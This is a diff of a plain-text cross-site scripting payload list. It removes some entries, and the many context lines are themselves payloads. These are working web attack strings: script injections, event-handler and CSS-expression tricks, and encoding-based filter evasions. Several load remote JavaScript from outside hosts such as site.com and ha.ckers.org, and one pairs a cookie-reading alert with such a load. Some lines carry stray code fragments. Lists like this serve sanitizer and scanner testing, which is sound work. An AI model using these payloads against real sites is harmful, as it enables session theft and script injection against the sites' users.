@@ -7,7 +7,7 @@ xss payloads
 
 %253Cscript%253Ealert('XSS')%253C%252Fscript%253E
 
-&lt;XSS STYLE="behavior: url(%(htc)s);"&gt;
+
 
 
 &lt;STYLE&gt;li {list-style-image: url("javascript:javascript:alert(1)");}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS
@@ -18,13 +18,13 @@ xss payloads
 
 &lt;STYLE&gt;.XSS{background-image:url("javascript:javascript:alert(1)");}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;
 
-&lt;HTML xmlns:xss&gt;&lt;?import namespace="xss" implementation="%(htc)s"&gt;&lt;xss:xss&gt;XSS&lt;/xss:xss&gt;&lt;/HTML&gt;""","XML namespace."),("""&lt;XML ID="xss"&gt;&lt;
+
 
 I&gt;&lt;B&gt;&lt;IMG SRC="javas&lt;!-- --&gt;cript:javascript:alert(1)"&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;&lt;SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"&gt;&lt;/SPAN&gt;
 
 &lt;HTML&gt;&lt;BODY&gt;&lt;?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"&gt;&lt;?import namespace="t" implementation="#default#time2"&gt;&lt;t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;javascript:alert(1)&lt;/SCRIPT&gt;"&gt;&lt;/BODY&gt;&lt;/HTML&gt;
 
-'';!--"&lt;XSS&gt;=&{()}
+
 
 &lt;IMG SRC="javascript:alert('XSS');"&gt;
 
@@ -73,7 +73,7 @@ perl -e 'print "&lt;IMG SRC=java\0script:alert(\"XSS\")&gt;";' &gt; out
 
 &lt;STYLE&gt;li {list-style-image: url("javascript:alert('XSS')");}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS&lt;/br&gt;
 
-&lt;IMG SRC='vbscript:msgbox("XSS")'&gt;
+
 
 &lt;BODY ONLOAD=alert('XSS')&gt;
 
@@ -97,7 +97,7 @@ exp/*&lt;A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(alert("XSS"))'
 
 &lt;XSS STYLE="xss:expression(alert('XSS'))"&gt;
 
-&lt;XSS STYLE="behavior: url(xss.htc);"&gt;
+
 
 ¼script¾alert(¢XSS¢)¼/script¾
 
@@ -127,19 +127,7 @@ exp/*&lt;A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(alert("XSS"))'
 
 &lt;HEAD&gt;&lt;META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
 
-&lt;A HREF="http://66.102.7.147/"&gt;XSS&lt;/A&gt;
 
-&lt;A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D"&gt;XSS&lt;/A&gt;
-
-&lt;A HREF="http://1113982867/"&gt;XSS&lt;/A&gt;
-
-&lt;A HREF="http://0x42.0x0000066.0x7.0x93/"&gt;XSS&lt;/A&gt;
-
-&lt;A HREF="http://0102.0146.0007.00000223/"&gt;XSS&lt;/A&gt;
-
-&lt;A HREF="htt    p://6   6.000146.0x7.147/"&gt;XSS&lt;/A&gt;
-
-&lt;script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)&gt;&lt;/script
 
 &lt;IMG SRC=jAVasCrIPt:alert(‘XSS’)&gt;
 
@@ -171,9 +159,7 @@ exp/*&lt;A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(alert("XSS"))'
 
 &lt;script&gt;alert("XSS");&lt;/script&gt;&search=1
 
-&lt;input onfocus=write(XSS) autofocus&gt;
 
-&lt;input onblur=write(XSS) autofocus&gt;&lt;input autofocus&gt;
 
 &lt;body onscroll=alert(XSS)&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;...&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;
 
@@ -249,7 +235,7 @@ xss&#58;ex&#x2F;*XSS*//*/*/pression(alert(\"XSS\"))'&gt;
 
 d=\"alert('XSS');\\")\";
 
-&lt;HTML xmlns&#58;xss&gt;&lt;?import namespace=\"xss\" implementation=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;htc\"&gt;&lt;xss&#58;xss&gt;XSS&lt;/xss&#58;xss&gt;&lt;/HTML&gt;
+
 
 &lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;!&#91;CDATA&#91;&lt;IMG SRC=\"javas&#93;&#93;&gt;&lt;!&#91;CDATA&#91;cript&#58;alert('XSS');\"&gt;&#93;&#93;&gt;
 
@@ -263,33 +249,7 @@ echo('IPT&gt;alert(\"XSS\")&lt;/SCRIPT&gt;'); ?&gt;
 
 &lt;HEAD&gt;&lt;META HTTP-EQUIV=\"CONTENT-TYPE\" CONTENT=\"text/html; charset=UTF-7\"&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
 
-&lt;A HREF=\"http&#58;//66&#46;102&#46;7&#46;147/\"&gt;XSS&lt;/A&gt;
 
-&lt;A HREF=\"http&#58;//%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D\"&gt;XSS&lt;/A&gt;
-
-&lt;A HREF=\"http&#58;//1113982867/\"&gt;XSS&lt;/A&gt;
-
-&lt;A HREF=\"http&#58;//0x42&#46;0x0000066&#46;0x7&#46;0x93/\"&gt;XSS&lt;/A&gt;
-
-&lt;A HREF=\"http&#58;//0102&#46;0146&#46;0007&#46;00000223/\"&gt;XSS&lt;/A&gt;
-
-&lt;A HREF=\"htt p&#58;//6 6&#46;000146&#46;0x7&#46;147/\"&gt;XSS&lt;/A&gt;
-
-&lt;A HREF=\"//www&#46;google&#46;com/\"&gt;XSS&lt;/A&gt;
-
-&lt;A HREF=\"//google\"&gt;XSS&lt;/A&gt;
-
-&lt;A HREF=\"http&#58;//ha&#46;ckers&#46;org@google\"&gt;XSS&lt;/A&gt;
-
-&lt;A HREF=\"http&#58;//google&#58;ha&#46;ckers&#46;org\"&gt;XSS&lt;/A&gt;
-
-&lt;A HREF=\"http&#58;//google&#46;com/\"&gt;XSS&lt;/A&gt;
-
-&lt;A HREF=\"http&#58;//www&#46;google&#46;com&#46;/\"&gt;XSS&lt;/A&gt;
-
-&lt;A HREF=\"javascript&#058;document&#46;location='http&#58;//www&#46;google&#46;com/'\"&gt;XSS&lt;/A&gt;
-
-&lt;A HREF=\"http&#58;//www&#46;gohttp&#58;//www&#46;google&#46;com/ogle&#46;com/\"&gt;XSS&lt;/A&gt;
 
 &lt;IMG SRC=\"javascript&#058;alert('XSS')\"
 
@@ -331,7 +291,7 @@ perl -e 'print \"&lt;IMG SRC=java\0script&#058;alert(\\"XSS\\")&gt;\";' &gt; out
 
 exp/*&lt;A STYLE='no\xss:noxss("*//*");xss:&#101;x&#x2F;*XSS*//*/*/pression(alert("XSS"))'&gt;
 
-a="get";b="URL(ja\"";c="vascr";d="ipt:ale";e="rt('XSS');\")";eval(a+b+c+d+e);
+
 
 &lt;HTML&gt;&lt;BODY&gt;&lt;?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"&gt;&lt;?import namespace="t" implementation="#default#time2"&gt;&lt;t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;"&gt;&lt;/BODY&gt;&lt;/HTML&gt;
 
@@ -421,15 +381,15 @@ perl -e 'print \"&lt;IMG SRC=java\0script:alert(\"XSS\")&gt;\";' &gt; out
 
 &lt;body onLoad="while(true) alert('XSS');"&gt;
 
-'&gt;"&gt;&lt;script src = 'http://www.site.com/XSS.js'&gt;&lt;/script&gt;
+
 
 }&lt;/style&gt;&lt;script&gt;a=eval;b=alert;a(b(/XSS/.source));&lt;/script&gt;
 
-&lt;SCRIPT&gt;document.write("XSS");&lt;/SCRIPT&gt;
+
 
 "&gt;/XaDoS/&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;script src="http://www.site.com/XSS.js"&gt;&lt;/script&gt;
 
-src="http://www.site.com/XSS.js"&gt;&lt;/script&gt;
+
 
 &lt;script&gt;alert("XSS by \nxss")&lt;/script&gt;&lt;marquee&gt;&lt;h1&gt;XSS by xss&lt;/h1&gt;&lt;/marquee&gt;
 
@@ -449,9 +409,7 @@ src="http://www.site.com/XSS.js"&gt;&lt;/script&gt;
 &lt;iframe src="javascript:alert('XSS by \nxss');"&gt;&lt;/iframe&gt;&lt;marquee&gt;&lt;h1&gt;XSS by xss&lt;/h1&gt;&lt;/marquee&gt;
 
 
-http://www.simpatie.ro/index.php?page=friends&member=781339&javafunctionname=Pageclick&javapgno=2 javapgno=2 ??XSS??
 
-http://www.simpatie.ro/index.php?page=top_movies&cat=13&p=2 p=2 ??XSS??
 
 &lt;SCRIPT&gt; alert(“XSS”); &lt;/SCRIPT&gt;
 
@@ -459,7 +417,7 @@ http://www.simpatie.ro/index.php?page=top_movies&cat=13&p=2 p=2 ??XSS??
 
 &lt;TD BACKGROUND="javascript:alert('XSS')"&gt;
 
-&apos;&apos;;!--&quot;&lt;XSS&gt;=&amp;{()}
+
 
 &lt;SCRIPT&gt;alert(&apos;XSS&apos;)&lt;/SCRIPT&gt;
 
@@ -491,11 +449,10 @@ http://www.simpatie.ro/index.php?page=top_movies&cat=13&p=2 p=2 ??XSS??
 
 &lt;IMG LOWSRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;
 
-exp/*&lt;XSS STYLE=&apos;no\xss:noxss(&quot;*//*&quot;);
+
 
 &lt;STYLE&gt;li {list-style-image: url(&quot;javascript:alert(&#39;XSS&#39;)&quot;);}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS
 
-&lt;IMG SRC=&apos;vbscript:msgbox(&quot;XSS&quot;)&apos;&gt;
 
 &lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=javascript:alert(&apos;XSS&apos;);&quot;&gt;
 
@@ -527,7 +484,7 @@ a=&quot;get&quot;;&amp;#10;b=&quot;URL(&quot;&quot;;&amp;#10;c=&quot;javascript:
 
 &lt;META HTTP-EQUIV=&quot;Set-Cookie&quot; Content=&quot;USERID=&lt;SCRIPT&gt;alert(&apos;XSS&apos;)&lt;/SCRIPT&gt;&quot;&gt;
 
-&lt;XSS STYLE=&quot;behavior: url(http://ha.ckers.org/xss.htc);&quot;&gt;
+
 
 &lt;BR SIZE=&quot;&amp;{alert(&apos;XSS&apos;)}&quot;&gt;
 
@@ -567,51 +524,7 @@ perl -e &apos;print &quot;&amp;&lt;SCR\0IPT&gt;alert(&quot;XSS&quot;)&lt;/SCR\0I
 
 &lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;
 
-&lt;SCRIPT&gt;a=/XSS/
 
-&lt;A HREF=&quot;http://66.102.7.147/&quot;&gt;XSS&lt;/A&gt;
-
-&lt;A HREF=&quot;http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D&quot;&gt;XSS&lt;/A&gt;
-
-&lt;A HREF=&quot;http://1113982867/&quot;&gt;XSS&lt;/A&gt;
-
-&lt;A HREF=&quot;http://0x42.0x0000066.0x7.0x93/&quot;&gt;XSS&lt;/A&gt;
-
-&lt;A HREF=&quot;http://0102.0146.0007.00000223/&quot;&gt;XSS&lt;/A&gt;
-
-&lt;A HREF=&quot;h&#x0A;tt&#09;p://6&amp;#09;6.000146.0x7.147/&quot;&gt;XSS&lt;/A&gt;
-
-&lt;A HREF=&quot;//www.google.com/&quot;&gt;XSS&lt;/A&gt;
-
-&lt;A HREF=&quot;//google&quot;&gt;XSS&lt;/A&gt;
-
-&lt;A HREF=&quot;http://ha.ckers.org@google&quot;&gt;XSS&lt;/A&gt;
-
-&lt;A HREF=&quot;http://google:ha.ckers.org&quot;&gt;XSS&lt;/A&gt;
-
-&lt;A HREF=&quot;http://google.com/&quot;&gt;XSS&lt;/A&gt;
-
-&lt;A HREF=&quot;http://www.google.com./&quot;&gt;XSS&lt;/A&gt;
-
-&lt;A HREF=&quot;javascript:document.location=&apos;http://www.google.com/&apos;&quot;&gt;XSS&lt;/A&gt;
-
-&lt;A HREF=&quot;http://www.gohttp://www.google.com/ogle.com/&quot;&gt;XSS&lt;/A&gt;
-
-&lt;script&gt;a=/XSS/\ndocument.vulnerable=true;&lt;/script&gt;
-
-&lt;style&gt;li {list-style-image: url("javascript:document.vulnerable=true;");&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS
-
-&lt;img STYLE="xss:expr/*XSS*/ession(document.vulnerable=true)"&gt;
-
-&lt;XSS STYLE="xss:expression(document.vulnerable=true)"&gt;
-
-exp/*&lt;A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(document.vulnerable=true)'&gt;
-
-&lt;style&gt;.XSS{background-image:url("javascript:document.vulnerable=true");}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/a&gt;
-
-&lt;html&gt;&lt;BODY&gt;&lt;?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"&gt;&lt;?import namespace="t" implementation="#default#time2"&gt;&lt;t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;document.vulnerable=true&lt;/SCRIPT&gt;"&gt;&lt;/BODY&gt;&lt;/html&gt;
-
-&lt;HTML xmlns:xss&gt;&lt;?import namespace="xss" implementation="http://www.securitycompass.com/xss.htc"&gt;&lt;xss:xss&gt;XSS&lt;/xss:xss&gt;&lt;/html&gt;
 
 &quot;&gt;&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;
 
@@ -637,7 +550,7 @@ XSS STYLE=xss:e/**/xpression(alert('XSS'))&gt;
 
 &lt;/XSS STYLE=xss:expression(alert('XSS'))&gt;
 
-';';;!--";&lt;;XSS&gt;;=&;{()}
+
 
 &lt;;SCRIPT&gt;;alert(';XSS';)&lt;;/SCRIPT&gt;;
 
@@ -669,11 +582,10 @@ XSS STYLE=xss:e/**/xpression(alert('XSS'))&gt;
 
 &lt;;IMG LOWSRC=";javascript:alert(';XSS';);";&gt;;
 
-exp/*&lt;;XSS STYLE=';no\xss:noxss(";*//*";);
+
 
 &lt;;STYLE&gt;;li {list-style-image: url(";javascript:alert(&#39;XSS&#39;)";);}&lt;;/STYLE&gt;;&lt;;UL&gt;;&lt;;LI&gt;;XSS
 
-&lt;;IMG SRC=';vbscript:msgbox(";XSS";)';&gt;;
 
 &lt;;META HTTP-EQUIV=";refresh"; CONTENT=";0;url=javascript:alert(';XSS';);";&gt;;
 
@@ -705,7 +617,7 @@ a=";get";;&;#10;b=";URL(";";;&;#10;c=";javascript:";;&;#10;d=";alert(';XSS';);";
 
 &lt;;META HTTP-EQUIV=";Set-Cookie"; Content=";USERID=&lt;;SCRIPT&gt;;alert(';XSS';)&lt;;/SCRIPT&gt;;";&gt;;
 
-&lt;;XSS STYLE=";behavior: url(http://ha.ckers.org/xss.htc);";&gt;;
+
 
 &lt;;BR SIZE=";&;{alert(';XSS';)}";&gt;;
 
@@ -737,7 +649,7 @@ perl -e ';print ";&;&lt;;SCR\0IPT&gt;;alert(";XSS";)&lt;;/SCR\0IPT&gt;;";;'; &gt
 
 &lt;;IMG SRC="; &;#14;  javascript:alert(';XSS';);";&gt;;
 
-&lt;;SCRIPT/XSS SRC=";http://ha.ckers.org/xss.js";&gt;;&lt;;/SCRIPT&gt;;
+
 
 
 &lt;;BODY onload!#$%&;()*~+-_.,:;?@[/|\]^`=alert(";XSS";)&gt;;
@@ -749,35 +661,6 @@ perl -e ';print ";&;&lt;;SCR\0IPT&gt;;alert(";XSS";)&lt;;/SCR\0IPT&gt;;";;'; &gt
 &lt;;IMG ";";";&gt;;&lt;;SCRIPT&gt;;alert(";XSS";)&lt;;/SCRIPT&gt;;";&gt;;
 
 
-&lt;;SCRIPT&gt;;a=/XSS/
-
-&lt;;A HREF=";http://66.102.7.147/";&gt;;XSS&lt;;/A&gt;;
-
-&lt;;A HREF=";http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D";&gt;;XSS&lt;;/A&gt;;
-
-&lt;;A HREF=";http://1113982867/";&gt;;XSS&lt;;/A&gt;;
-
-&lt;;A HREF=";http://0x42.0x0000066.0x7.0x93/";&gt;;XSS&lt;;/A&gt;;
-
-&lt;;A HREF=";http://0102.0146.0007.00000223/";&gt;;XSS&lt;;/A&gt;;
-
-&lt;;A HREF=";h&#x0A;tt&#09;p://6&;#09;6.000146.0x7.147/";&gt;;XSS&lt;;/A&gt;;
-
-&lt;;A HREF=";//www.google.com/";&gt;;XSS&lt;;/A&gt;;
-
-&lt;;A HREF=";//google";&gt;;XSS&lt;;/A&gt;;
-
-&lt;;A HREF=";http://ha.ckers.org@google";&gt;;XSS&lt;;/A&gt;;
-
-&lt;;A HREF=";http://google:ha.ckers.org";&gt;;XSS&lt;;/A&gt;;
-
-&lt;;A HREF=";http://google.com/";&gt;;XSS&lt;;/A&gt;;
-
-&lt;;A HREF=";http://www.google.com./";&gt;;XSS&lt;;/A&gt;;
-
-&lt;;A HREF=";javascript:document.location=';http://www.google.com/';";&gt;;XSS&lt;;/A&gt;;
-
-&lt;;A HREF=";http://www.gohttp://www.google.com/ogle.com/";&gt;;XSS&lt;;/A&gt;;
 
 ";&gt;;&lt;;BODY onload!#$%&;()*~+-_.,:;?@[/|\]^`=alert(";XSS";)&gt;;
 
@@ -1407,7 +1290,6 @@ xlink:href="javascript:javascript:alert(1)"&gt;CLICKME&lt;/maction&gt; &lt;/math
 
 &lt;div id="div1"&gt;&lt;input value="``onmouseover=javascript:alert(1)"&gt;&lt;/div&gt; &lt;div id="div2"&gt;&lt;/div&gt;&lt;script&gt;
 
-document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;&lt;/script&gt;
 
 &lt;x '="foo"&gt;&lt;x foo='&gt;&lt;img src=x onerror=javascript:alert(1)//'&gt;
 
